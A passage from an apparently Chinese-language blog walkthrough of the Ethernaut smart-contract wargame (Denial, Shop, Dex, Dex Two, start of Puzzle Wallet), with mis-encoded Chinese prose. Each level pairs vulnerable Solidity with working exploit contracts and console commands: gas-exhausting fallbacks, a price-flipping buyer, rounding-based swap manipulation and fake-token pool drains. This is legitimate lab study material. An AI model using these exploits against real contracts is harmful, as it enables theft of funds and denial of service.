è€—å…‰<ul><li>ä½¿ç”¨ <code>assert</code> å¤±è´¥çš„è¯ï¼Œå°†ä¼š <code>spend all gas</code> ï¼Œè¿™æ ·çš„è¯ <code>owner.transfer(amountToSend)</code> å°†æ‰§è¡Œå¤±è´¥</li><li>é‡å…¥æ¼æ´ <code>partner.call.value(amountToSend)()</code> ï¼Œåˆ©ç”¨é‡å…¥æ¼æ´æŠŠ <code>gas</code> æ¶ˆè€—å®Œ</li></ul></li></ul><h3 id="æ”»å‡»æµç¨‹-7"><a href="#æ”»å‡»æµç¨‹-7" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>import &quot;@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol&quot;;<br><br>contract Denial &#123;<br><br>    using SafeMath for uint256;<br>    address public partner; // withdrawal partner - pay the gas, split the withdraw<br>    address payable public constant owner = address(0xA9E);<br>    uint timeLastWithdrawn;<br>    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances<br><br>    function setWithdrawPartner(address _partner) public &#123;<br>        partner = _partner;<br>    &#125;<br><br>    // withdraw 1% to recipient and 1% to owner<br>    function withdraw() public &#123;<br>        uint amountToSend = address(this).balance.div(100);<br>        // perform a call without checking return<br>        // The recipient can revert, the owner will still get their share<br>        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);<br>        owner.transfer(amountToSend);<br>        // keep track of last withdrawal time<br>        timeLastWithdrawn = now;<br>        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);<br>    &#125;<br><br>    // allow deposit of funds<br>    receive() external payable &#123;&#125;<br><br>    // convenience function<br>    function contractBalance() public view returns (uint) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br><br>contract exploit1 &#123;<br>    address payable instance_add = 0x015307cCEE55050ae6743c019aDc847ae32c6efA;<br>    Denial denial = Denial(instance_add);<br><br>    function attack() public &#123;<br>        denial.setWithdrawPartner(address(this));<br>        denial.withdraw();<br>    &#125;<br><br>    fallback() payable external&#123;<br>        assert(0==1);<br>    &#125;<br>&#125;<br><br>contract exploit2 &#123;<br>    address payable instance_add = 0xE8E0615aA560F06D0361Abb92c11230DC2671b59;<br><br>    function attack() public &#123;<br>        instance_add.call(abi.encodeWithSignature(&quot;setWithdrawPartner(address)&quot;,this));<br>        instance_add.call(abi.encodeWithSignature(&quot;withdraw()&quot;)); <br>    &#125;<br><br>    fallback() payable external&#123;<br>        instance_add.call(abi.encodeWithSignature(&quot;withdraw()&quot;)); <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220308223509185.png" alt="image-20220308223509185"></p><h2 id="21-Shop"><a href="#21-Shop" class="headerlink" title="21. Shop"></a>21. Shop</h2><h3 id="é—¯å…³è¦æ±‚-8"><a href="#é—¯å…³è¦æ±‚-8" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>ä»å•†åº—ä»¥ä½äºè¦æ±‚çš„ä»·æ ¼è´­ä¹°å•†å“</p><h3 id="åˆçº¦ä»£ç -8"><a href="#åˆçº¦ä»£ç -8" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>interface Buyer &#123;<br>  function price() external view returns (uint);<br>&#125;<br><br>contract Shop &#123;<br>  uint public price = 100;<br>  bool public isSold;<br><br>  function buy() public &#123;<br>    Buyer _buyer = Buyer(msg.sender);<br><br>    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;<br>      isSold = true;<br>      price = _buyer.price();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-8"><a href="#åˆçº¦åˆ†æ-8" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>ç±»ä¼¼é¢˜ç›® Elevator</p><h3 id="æ”»å‡»æµç¨‹-8"><a href="#æ”»å‡»æµç¨‹-8" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>interface Buyer &#123;<br>  function price() external view returns (uint);<br>&#125;<br><br>contract Shop &#123;<br>  uint public price = 100;<br>  bool public isSold;<br><br>  function buy() public &#123;<br>    Buyer _buyer = Buyer(msg.sender);<br><br>    if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;<br>      isSold = true;<br>      price = _buyer.price();<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address instance_add = 0xB91785ecbbC89B9AEEDb41890bACfAa7C6C39467;<br>    Shop shop = Shop(instance_add);<br><br>    function price() external view returns (uint) &#123;<br>        return Shop(msg.sender).isSold() == true ? 99 : 100;<br>    &#125;<br><br>    function attack() public &#123;<br>        shop.buy();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220309133454833.png" alt="image-20220309133454833"></p><h2 id="22-Dex"><a href="#22-Dex" class="headerlink" title="22. Dex"></a>22. Dex</h2><h3 id="é—¯å…³è¦æ±‚-9"><a href="#é—¯å…³è¦æ±‚-9" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>æ­¤çº§åˆ«çš„ç›®æ ‡æ˜¯è®©æ‚¨ç ´è§£ä¸‹é¢çš„åŸºæœ¬ DEX åˆçº¦å¹¶é€šè¿‡ä»·æ ¼æ“çºµçªƒå–èµ„é‡‘ã€‚</p><p>æ‚¨å°†ä» token1 çš„ 10 ä¸ªä»¤ç‰Œå’Œ token2 çš„ 10 ä¸ªä»¤ç‰Œå¼€å§‹ã€‚ DEX åˆçº¦ä»¥æ¯ä¸ªä»£å¸ 100 ä¸ªå¼€å§‹ã€‚</p><p>å¦‚æœæ‚¨è®¾æ³•ä»åˆçº¦ä¸­å–å‡ºæ‰€æœ‰ 2 ä¸ªä»£å¸ä¸­çš„è‡³å°‘ 1 ä¸ªï¼Œå¹¶å…è®¸åˆçº¦æŠ¥å‘Šèµ„äº§çš„â€œåâ€ä»·æ ¼ï¼Œæ‚¨å°†åœ¨æ­¤çº§åˆ«ä¸Šå–å¾—æˆåŠŸã€‚ </p><h3 id="åˆçº¦ä»£ç -9"><a href="#åˆçº¦ä»£ç -9" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;<br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Dex  &#123;<br>  using SafeMath for uint;<br>  address public token1;<br>  address public token2;<br>  constructor(address _token1, address _token2) public &#123;<br>    token1 = _token1;<br>    token2 = _token2;<br>  &#125;<br><br>  function swap(address from, address to, uint amount) public &#123;<br>    require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);<br>    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);<br>    uint swap_amount = get_swap_price(from, to, amount);<br>    IERC20(from).transferFrom(msg.sender, address(this), amount);<br>    IERC20(to).approve(address(this), swap_amount);<br>    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);<br>  &#125;<br><br>  function add_liquidity(address token_address, uint amount) public&#123;<br>    IERC20(token_address).transferFrom(msg.sender, address(this), amount);<br>  &#125;<br><br>  function get_swap_price(address from, address to, uint amount) public view returns(uint)&#123;<br>    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));<br>  &#125;<br><br>  function approve(address spender, uint amount) public &#123;<br>    SwappableToken(token1).approve(spender, amount);<br>    SwappableToken(token2).approve(spender, amount);<br>  &#125;<br><br>  function balanceOf(address token, address account) public view returns (uint)&#123;<br>    return IERC20(token).balanceOf(account);<br>  &#125;<br>&#125;<br><br>contract SwappableToken is ERC20 &#123;<br>  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;<br>        _mint(msg.sender, initialSupply);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-9"><a href="#åˆçº¦åˆ†æ-9" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>æœ‰ä¸¤ç§æ–¹æ³•</p><ol><li><p>åˆ©ç”¨ <code>get_swap_price</code> ä¸­çš„æ±‡ç‡</p><p><code>get_swap_price</code> æ˜¯ç¡®å®š Dex ä¸­ä»£å¸ä¹‹é—´æ±‡ç‡çš„æ–¹æ³•ã€‚å…¶ä¸­çš„é™¤æ³•å¹¶ä¸æ€»æ˜¯è®¡ç®—ä¸ºä¸€ä¸ªå®Œç¾çš„æ•´æ•°ï¼Œè€Œæ˜¯ä¸€ä¸ªåˆ†æ•°ã€‚Solidity ä¸­æ²¡æœ‰åˆ†æ•°ç±»å‹ã€‚æ‰€ä»¥ä¼šæœ‰<code>3 / 2 = 1</code> çš„æƒ…å†µå‡ºç°</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/7B6FB5F9CF1BF9AB445A37251DB0CEAA.jpg" alt="img"></p></li><li><p>æ–°å»º <code>token3</code> æ¢å– <code>token1</code> å³å¯</p></li></ol><h3 id="æ”»å‡»æµç¨‹-9"><a href="#æ”»å‡»æµç¨‹-9" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><ol><li><p>è·³å…¥æ§åˆ¶å°ã€‚é¦–å…ˆæ‰¹å‡†åˆåŒä»¥è½¬ç§»æ‚¨çš„ä»£å¸ï¼Œå¹¶æä¾›è¶³å¤Ÿå¤§çš„é™é¢ï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸å¿…ä¸€æ¬¡åˆä¸€æ¬¡åœ°æ‰¹å‡†ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.approve(contract.address, <span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p>è·å–ä»¤ç‰Œåœ°å€ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">t1 = <span class="hljs-keyword">await</span> contract.token1()<br>t2 = <span class="hljs-keyword">await</span> contract.token2()<br></code></pre></td></tr></table></figure><p>ç°åœ¨å¯¹ä¸Šé¢çš„è¡¨è¡Œä¸€ä¸€å¯¹åº”æ‰§è¡Œ 7 æ¬¡äº¤æ¢ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.swap(t1, t2, <span class="hljs-number">10</span>)<br><span class="hljs-keyword">await</span> contract.swap(t2, t1, <span class="hljs-number">20</span>)<br><span class="hljs-keyword">await</span> contract.swap(t1, t2, <span class="hljs-number">24</span>)<br><span class="hljs-keyword">await</span> contract.swap(t2, t1, <span class="hljs-number">30</span>)<br><span class="hljs-keyword">await</span> contract.swap(t1, t2, <span class="hljs-number">41</span>)<br><span class="hljs-keyword">await</span> contract.swap(t2, t1, <span class="hljs-number">45</span>)<br></code></pre></td></tr></table></figure><p>é€šè¿‡ä»¥ä¸‹æ–¹å¼éªŒè¯ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.balanceOf(t1, instance).then(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v.toString())<br><br><span class="hljs-comment">// Output: &#x27;0&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220310221300541.png" alt="image-20220310221300541"></p></li><li><p>ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.6.0;<br><br>contract MyERC20Token &#123;<br>    address hacker = 0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624;<br>    address target = 0x1352D4d6EbA9aDcb4827765DC93a877588d8bd33;<br>    <br>    function balanceOf(address account) public view returns (uint256) &#123;<br>        if (account == hacker || account == target) &#123;<br>            return 1;<br>        &#125; else &#123;<br>            return 1;<br>        &#125;<br>    &#125;<br><br>    function transferFrom(address, address, uint256) public returns (bool) &#123;<br>        return true;<br>    &#125;<br>&#125;<br><br>interface Dex &#123;<br>    function swap(address, address, uint) external;<br>&#125;<br><br>contract exploit &#123;<br>    address token3 = address(new MyERC20Token());<br>    Dex dex = Dex(0x1352D4d6EbA9aDcb4827765DC93a877588d8bd33);<br>    address token1 = 0xd3752A3Aec6d7f94a94aA78E8651bb490d44d97D;<br>    address token2 = 0x190353BB8118e70aFB739c477f5b4ff1dB624eAD;<br>    <br>    constructor() public &#123;<br>        dex.swap(token3,token2,1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="23-Dex-Two"><a href="#23-Dex-Two" class="headerlink" title="23. Dex Two"></a>23. Dex Two</h2><h3 id="é—¯å…³è¦æ±‚-10"><a href="#é—¯å…³è¦æ±‚-10" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>æ­¤çº§åˆ«å°†è¦æ±‚æ‚¨ä»¥ä¸åŒçš„æ–¹å¼æ‰“ç ´ DexTwoï¼Œè¿™æ˜¯å¯¹å‰ä¸€çº§åˆ«è¿›è¡Œäº†ç»†å¾®ä¿®æ”¹çš„ Dex åˆçº¦ã€‚</p><p>æ‚¨éœ€è¦ä» DexTwo åˆçº¦ä¸­è€—å°½ token1 å’Œ token2 çš„æ‰€æœ‰ä½™é¢æ‰èƒ½åœ¨æ­¤çº§åˆ«ä¸Šå–å¾—æˆåŠŸã€‚</p><p>æ‚¨ä»å°†ä» token1 çš„ 10 ä¸ªä»¤ç‰Œå’Œ token2 çš„ 10 ä¸ªä»¤ç‰Œå¼€å§‹ã€‚ DEX åˆçº¦ä»ç„¶ä»¥æ¯ä¸ªä»£å¸ 100 ä¸ªå¼€å§‹ã€‚</p><h3 id="åˆçº¦ä»£ç -10"><a href="#åˆçº¦ä»£ç -10" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;;<br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract DexTwo  &#123;<br>  using SafeMath for uint;<br>  address public token1;<br>  address public token2;<br>  constructor(address _token1, address _token2) public &#123;<br>    token1 = _token1;<br>    token2 = _token2;<br>  &#125;<br><br>  function swap(address from, address to, uint amount) public &#123;<br>    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);<br>    uint swap_amount = get_swap_amount(from, to, amount);<br>    IERC20(from).transferFrom(msg.sender, address(this), amount);<br>    IERC20(to).approve(address(this), swap_amount);<br>    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);<br>  &#125;<br><br>  function add_liquidity(address token_address, uint amount) public&#123;<br>    IERC20(token_address).transferFrom(msg.sender, address(this), amount);<br>  &#125;<br><br>  function get_swap_amount(address from, address to, uint amount) public view returns(uint)&#123;<br>    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));<br>  &#125;<br><br>  function approve(address spender, uint amount) public &#123;<br>    SwappableTokenTwo(token1).approve(spender, amount);<br>    SwappableTokenTwo(token2).approve(spender, amount);<br>  &#125;<br><br>  function balanceOf(address token, address account) public view returns (uint)&#123;<br>    return IERC20(token).balanceOf(account);<br>  &#125;<br>&#125;<br><br>contract SwappableTokenTwo is ERC20 &#123;<br>  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;<br>        _mint(msg.sender, initialSupply);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åˆçº¦åˆ†æ-10"><a href="#åˆçº¦åˆ†æ-10" class="headerlink" title="åˆçº¦åˆ†æ"></a>åˆçº¦åˆ†æ</h3><p>ä¸DexåŒç†</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">          DEX             |          player  </span><br><span class="hljs-section">token1 - token2 - token3  | token1 - token2 - token3</span><br><span class="hljs-section">-----------------------------------------------------</span><br><span class="hljs-code">  100     100      100    |   10      10      300</span><br><span class="hljs-code">  0       100      200    |   110     10      200</span><br><span class="hljs-code">  0       0        400    |   110     110     0</span><br></code></pre></td></tr></table></figure><h3 id="æ”»å‡»æµç¨‹-10"><a href="#æ”»å‡»æµç¨‹-10" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h3><p>åˆ›å»ºtoken3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br><br>contract Token3 is ERC20 &#123;<br>    constructor(uint256 initialSupply) ERC20(&quot;Token3&quot;, &quot;t3&quot;) &#123;<br>        _mint(msg.sender, initialSupply);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŒ‡å®šåœ°å€</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220311152621066.png" alt="image-20220311152621066"></p><p>å‘åˆçº¦ä¸­çš„t3æ‰“å…¥100ï¼Œå¹¶æ‰¹å‡†åˆåŒä»¥è½¬ç§»ä»£å¸</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220311152722301.png" alt="image-20220311152722301"></p><p>å®ä¾‹ä¸­ä¹Ÿéœ€è¦æ‰¹å‡†</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.approve(contract.address, <span class="hljs-number">500</span>)<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥ä½™é¢</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220311152856176.png" alt="image-20220311152856176"></p><p>ä¾æ¬¡æ‰§è¡Œ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.swap(t3, t1, <span class="hljs-number">100</span>)<br><span class="hljs-keyword">await</span> contract.swap(t3, t2, <span class="hljs-number">200</span>)<br></code></pre></td></tr></table></figure><p>å†æ¬¡æ£€æŸ¥ä½™é¢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">await</span> contract.balanceOf(t1, instance).then(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v.toString())<br><span class="hljs-comment">//&#x27;0&#x27;</span><br><br><span class="hljs-keyword">await</span> contract.balanceOf(t2, instance).then(<span class="hljs-function"><span class="hljs-params">v</span> =&gt;</span> v.toString())<br><span class="hljs-comment">//&#x27;0&#x27;</span><br></code></pre></td></tr></table></figure><p>æäº¤å®ä¾‹</p><p><img src="/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/image-20220311153054894.png" alt="image-20220311153054894"></p><h2 id="24-Puzzle-Wallet"><a href="#24-Puzzle-Wallet" class="headerlink" title="24. Puzzle Wallet"></a>24. Puzzle Wallet</h2><h3 id="é—¯å…³è¦æ±‚-11"><a href="#é—¯å…³è¦æ±‚-11" class="headerlink" title="é—¯å…³è¦æ±‚"></a>é—¯å…³è¦æ±‚</h3><p>äº‹å®ä¸Šï¼Œå¦‚ä»Šï¼Œä¸º DeFi è¿è¥ä»˜è´¹æ˜¯ä¸å¯èƒ½çš„ã€‚</p><p>ä¸€ç¾¤æœ‹å‹å‘ç°äº†å¦‚ä½•é€šè¿‡åœ¨ä¸€ä¸ªäº¤æ˜“ä¸­æ‰¹é‡å¤„ç†æ¥ç¨å¾®é™ä½æ‰§è¡Œå¤šä¸ªäº¤æ˜“çš„æˆæœ¬ï¼Œå› æ­¤ä»–ä»¬å¼€å‘äº†ä¸€ä¸ªæ™ºèƒ½åˆçº¦æ¥æ‰§è¡Œæ­¤æ“ä½œã€‚</p><p>ä»–ä»¬éœ€è¦è¿™ä¸ªåˆçº¦æ˜¯å¯å‡çº§çš„ï¼Œä»¥é˜²ä»£ç åŒ…å«é”™è¯¯ï¼Œä»–ä»¬è¿˜æƒ³é˜»æ­¢å›¢é˜Ÿå¤–çš„äººä½¿ç”¨å®ƒã€‚ ä¸ºæ­¤ï¼Œä»–ä»¬æŠ•ç¥¨å¹¶åˆ†é…äº†ä¸¤ä¸ªåœ¨ç³»ç»Ÿä¸­å…·æœ‰ç‰¹æ®Šè§’è‰²çš„äººï¼šç®¡ç†å‘˜ï¼Œæœ‰æƒæ›´æ–°æ™ºèƒ½åˆçº¦çš„é€»è¾‘ã€‚ æ‰€æœ‰è€…ï¼Œæ§åˆ¶å…è®¸ä½¿ç”¨åˆçº¦çš„åœ°å€ç™½åå•ã€‚ åˆåŒå·²éƒ¨ç½²ï¼Œè¯¥ç»„è¢«åˆ—å…¥ç™½åå•ã€‚ æ¯ä¸ªäººéƒ½ä¸ºä»–ä»¬å¯¹æŠ—é‚ªæ¶çŸ¿å·¥çš„æˆå°±æ¬¢å‘¼ã€‚</p><p>ä»–ä»¬å‡ ä¹ä¸çŸ¥é“ï¼Œä»–ä»¬çš„åˆé¤é’±å¤„äºå±é™©ä¹‹ä¸­â€¦â€¦</p><p>ä½ éœ€è¦åŠ«æŒè¿™ä¸ªé’±åŒ…æ‰èƒ½æˆä¸ºä»£ç†çš„ç®¡ç†å‘˜ã€‚</p><h3 id="åˆçº¦ä»£ç -11"><a href="#åˆçº¦ä»£ç -11" class="headerlink" title="åˆçº¦ä»£ç "></a>åˆçº¦ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 